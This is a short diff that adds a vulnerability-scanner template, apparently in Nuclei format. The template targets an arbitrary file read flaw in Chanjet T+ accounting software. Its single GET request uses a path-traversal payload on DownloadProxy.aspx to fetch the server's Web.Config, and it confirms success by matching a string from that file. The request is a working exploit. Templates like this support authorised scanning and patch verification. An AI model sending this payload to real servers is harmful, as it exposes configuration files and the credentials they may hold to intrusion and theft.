@@ -1,0 +1,19 @@
+id: poc-yaml-chanjet-tplus-downloadproxy-file-read
+info:
+  name: "畅捷通 T+ DownloadProxy.aspx 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 畅捷通-TPlus
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<appSettings file=\"AccountOptionValidators.config\">"
